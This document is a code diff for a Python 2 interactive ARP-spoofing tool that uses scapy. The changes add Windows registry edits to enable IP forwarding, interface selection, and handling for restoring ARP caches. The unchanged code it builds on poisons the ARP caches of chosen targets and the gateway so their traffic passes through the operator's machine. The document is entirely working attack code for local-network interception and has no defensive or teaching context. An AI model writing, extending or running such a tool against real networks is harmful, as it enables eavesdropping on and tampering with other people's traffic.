@@ -1,8 +1,6 @@
 #!/usr/bin/env python2
 import sys
-import argparse
 import threading
-import Queue
 import time
 from scapy.all import *
 import os
@@ -16,6 +14,27 @@ import colorama
 import struct
 IP = CMD = 0
 MAC = TARGET = 1
+try:
+    import winreg
+    class creg:
+        registry_dir = "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters"
+        def __init__(self):
+            self.key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters', 0, winreg.KEY_ALL_ACCESS)
+        def GetValue(self):
+            try:
+                return winreg.QueryValueEx(self.key, "IPEnableRouter")[0]
+            except:
+                return None
+        def SetValue(self,value=0):
+            try:
+                winreg.SetValueEx(self.key,"IPEnableRouter",0,winreg.REG_DWORD,value)
+                if(self.GetValue() == value):
+                    return True
+                return False
+            except:
+                return False
+except ImportError:
+    pass
 colorama.init()
 def getMode(mode):
     if mode == "ok":
@@ -26,16 +45,26 @@ def getMode(mode):
         return "%s[!]%s"%(colorama.Fore.RED,colorama.Fore.RESET)
     elif mode in ["success"]:
         return "%s[*]%s"%(colorama.Fore.GREEN,colorama.Fore.RESET)
+def searchAndGetInterface(iname):
+    for i in ifaces.data.keys():
+        iface = ifaces.data[i]
+        wname = iface.data['netid']
+        if(wname == iname):
+            return iface
+    return selectInterface()
 def selectInterface():
     selections = {}
+    print("-1 > exit")
     for i,s in zip(ifaces.data.keys(),xrange(len(ifaces.data.keys()))):
         iface = ifaces.data[i]
         wname = iface.data['netid']
         selections[s] = iface
         print("%s > %s : %s"%(s,wname,get_if_addr(iface)))
     try:
-        return selections[input("Select interface > ")]
-    except:
+        s_ = int(input("Select interface > "))
+        if s_ == -1: sys.exit()
+        return selections[s_]
+    except KeyboardInterrupt:
         return selectInterface()
 lt = time.time()
 lt_ = 0.05
@@ -65,9 +94,10 @@ class ArpHandler:
         self.interface = interface
     def checkForwader(self):
         try:
-            with open(self.ip_forward_dir,"r") as fp:
-                value = bool(int(fp.read(1)))
-                return True
+            if(os.name == "posix"):
+                with open(self.ip_forward_dir,"r") as fp:
+                    value = bool(int(fp.read(1)))
+                    return True
         except:
             return False
     def isForwarderOpen(self):
@@ -94,8 +124,8 @@ class ArpHandler:
     def restoreArpCaches(self,target, gateway, verbose=True):
         # send correct ARP responses to the targets and the gateway
         for i in xrange(3):
-            send_ARP(target[IP], target[MAC], gateway[IP], gateway[MAC])
-            send_ARP(gateway[IP], gateway[MAC], target[IP], target[MAC])
+            self.sendArp(target[IP], target[MAC], gateway[IP], gateway[MAC])
+            self.sendArp(gateway[IP], gateway[MAC], target[IP], target[MAC])
             time.sleep(1)
     def sendArp(self,dst_ip,dst_mac,src_ip,src_mac):
         arp_packet = ARP(op=2, pdst=dst_ip, hwdst=dst_mac,
@@ -115,10 +145,17 @@ class ArpSpooferConsole:
     def __init__(self):
         self.cwd = get_username()
         self.Done = False
-        self.Interface  = "eth0"
+        self.Interface  = searchAndGetInterface("eth0" if os.name == "posix" else "Ethernet")
         self.Timeout = 5
-        self.Interface = selectInterface()
-        self.m_host = get_if_addr(self.Interface)
+        try:
+            self.arpHandler = ArpHandler(self.Interface)
+            self.m_host = get_if_addr(self.Interface)
+            self.m_mac = self.arpHandler.getMAC(self.m_host)
+        except:
+            self.Interface = selectInterface()
+            self.arpHandler = ArpHandler(self.Interface)
+            self.m_host = get_if_addr(self.Interface)
+            self.m_mac = self.arpHandler.getMAC(self.m_host)
         # try:
         #     mhost = get_if_addr(self.Interface)
         #     if(mhost):
@@ -137,8 +174,10 @@ class ArpSpooferConsole:
         #     except:
         #             print("Next time enter correctly")
         #             sys.exit(0)
-        self.arpHandler = ArpHandler(self.Interface)
         self.Targets = [
+
+        ]
+        self.Restores = [
 
         ]
         self.commands = {
@@ -151,7 +190,7 @@ class ArpSpooferConsole:
             "stop":self.Stop,
             "remove":self.Remove
         }
-        self.m_mac = self.arpHandler.getMAC(self.m_host)
+        self.InptStr = "%s%s@%s%s:"%(colorama.Fore.RED,self.cwd,self.m_host,colorama.Fore.RESET)
         self.gateway = ["",""]
         #Variables
         self.AtThread = False
@@ -173,6 +212,7 @@ class ArpSpooferConsole:
                 if target[IP] == tgt_ip:
                     self.Targets.remove(target)
                     printf("%s Removed to targets"%(tgt_ip))
+                    if(self.AtThread):self.Restores.append(target)
     def Start(self,args=[]):
         if(len(args) < 1):
             print("Usage : start <route-ip>")
@@ -241,12 +281,22 @@ class ArpSpooferConsole:
             for target in tdevices:
                 self.arpHandler.sendArp(target[IP],target[MAC],self.gateway[IP],self.m_mac)
                 self.arpHandler.sendArp(self.gateway[IP],self.gateway[MAC],target[IP],self.m_mac)
-            for t in tdevices:
-                if(not t in self.Targets):
-                    tdevices.remove(t)
-                    printf("[%s]%s Restoring..."%(t[MAC],t[IP]),mode="success")
+            time.sleep(1)
+            for t in self.Restores:
+                print("")
+                try:
+                    printf("[%s]%s Restoring..."%(t[MAC],t[IP]))
                     self.arpHandler.restoreArpCaches(t,self.gateway)
-
+                    printf("[%s]%s Restored..."%(t[MAC],t[IP]),mode="success")
+                    self.Restores.remove(t)
+                except:
+                    printf("[%s]%s Restore failed..."%(t[MAC],t[IP]),mode="error")
+                print self.InptStr,
+            #for t in tdevices:
+            #    if(not t in self.Targets):
+            #        tdevices.remove(t)
+            #        printf("[%s]%s Restoring..."%(t[MAC],t[IP]),mode="success")
+            #        self.arpHandler.restoreArpCaches(t,self.gateway)
             for t in self.Targets:
                 if(not t in tdevices):
                     tdevices.append(t)
@@ -292,7 +342,6 @@ class ArpSpooferConsole:
                 pdevices = []
                 # dt = self.CThread
                 # stime = time.time()
-                lns = ""
                 while self.CThread != self.GThread:
                     # if(self.CThread != dt or self.SThread != self.AThread):
                     #     dt=self.CThread
@@ -303,10 +352,9 @@ class ArpSpooferConsole:
                     for result in self.result:
                         if(not result in pdevices):
                             pdevices.append(result)
-                            print " "*len(lns),
-                            printf("[%s] %s is online."%(result[1],result[0]),mode="success",s="\r")
-                    lns = "\r%s %s Threads completed. %s Active devices. %s Active Threads. Goal Threads %s .\r \033[K"%(getLoader(),self.CThread,len(self.result),self.RThread,self.GThread)
-                    print lns,
+                            printf("[%s] %s is online.             "%(result[1],result[0]),mode="success",s="\r")
+                    print "\r%s %.2f%s [%s%s] %s Active .    \r"%(getLoader(),100.*self.CThread/self.GThread,"%","#"*(10*self.CThread/self.GThread)," "*(10-10*self.CThread/self.GThread),len(self.result)),
+                    sys.stdout.flush()
                     time.sleep(.05)
                 if(len(args) == 2):
                     if(args[1] in ["targets","tgts"]):
@@ -322,7 +370,7 @@ class ArpSpooferConsole:
                 #         if(thread.is_alive()):
                 #             ic+=1
                 #     printf("%s Threads alive"%(ic),mode="warn")
-
+            print("")
     def Show(self,args=[]):
         if(len(args) < 1):
             print("Missing Argumnets")
@@ -332,6 +380,7 @@ class ArpSpooferConsole:
             print("Interface = %s"%(self.Interface))
         elif(variable in ["targets","tgts"]):
             print("IP             \tMAC")
+            if(len(self.Targets) == 0): print("Target Not Found")
             for device in self.Targets:
                 print("%s\t%s"%(device[0],device[1]))
         elif(variable in ["timeout","tout"]):
@@ -343,9 +392,10 @@ class ArpSpooferConsole:
             print("Targets      \t%s%s Targets%s"%(colorama.Fore.BLUE,len(self.Targets),colorama.Fore.RESET))
         elif(variable in ["stats","status"]):
             if(self.AtThread):
-                print("IP             \tMAC\tStatus")
+                print("IP             \tMAC             \tStatus")
+                if(len(self.Targets) == 0):print("Target not found.")
                 for target in self.Targets:
-                    print("%s\t%s\t%sWorking%s"%(device[0],device[1],colorama.Fore.GREEN,colorama.Fore.RESET))
+                    print("%s\t%s\t %sWorking%s"%(target[0],target[1],colorama.Fore.GREEN,colorama.Fore.RESET))
             else:
                 printf("Attacker hasn't started",mode="warn")
     def Set(self,args=[]):
@@ -354,8 +404,12 @@ class ArpSpooferConsole:
             return
         variable = args[0]
         if(variable in ["interface","if"]):
-            value = args[1]
-            print("%s assigned as %s"%(self.Interface,value))
+            value = searchAndGetInterface(args[1])
+            if(not type(value) in [str,type(None)]):
+                vmname = value.data['netid']
+                print("%s assigned as %s"%(self.Interface,vmname))
+            else:
+                print("%s assigned as %s"%(self.Interface,value))
             self.Interface = value
             self.arpHandler.interface = self.Interface
         elif(variable in ["timeout","tout"]):
